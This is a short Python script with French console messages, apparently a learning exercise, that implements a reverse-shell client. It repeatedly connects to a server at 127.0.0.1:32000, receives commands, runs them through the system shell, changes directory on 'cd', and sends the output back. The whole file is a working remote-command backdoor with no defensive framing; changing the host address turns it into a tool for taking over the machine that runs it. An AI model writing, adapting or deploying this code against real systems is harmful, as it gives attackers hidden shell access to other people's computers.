import socket
import time
import os
import subprocess

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"connexion au serveur {HOST_IP} sur le port {HOST_PORT}")

while True:
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : Impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("connecté au serveur")
        break
sent_data = "coucou"
datarecues = "youpi"

while True:
    commande_bi = s.recv(MAX_DATA_SIZE)
    commande = commande_bi.decode()
    if commande == "exit":
        break
    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
        except FileNotFoundError:
            print("chemin incorrect")
    else :
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        response = resultat.stdout + resultat.stderr
        if not response or len(response) == 0:
            response = "ok"
        s.sendall(response.encode())
    if not commande:
        break

    


s.close()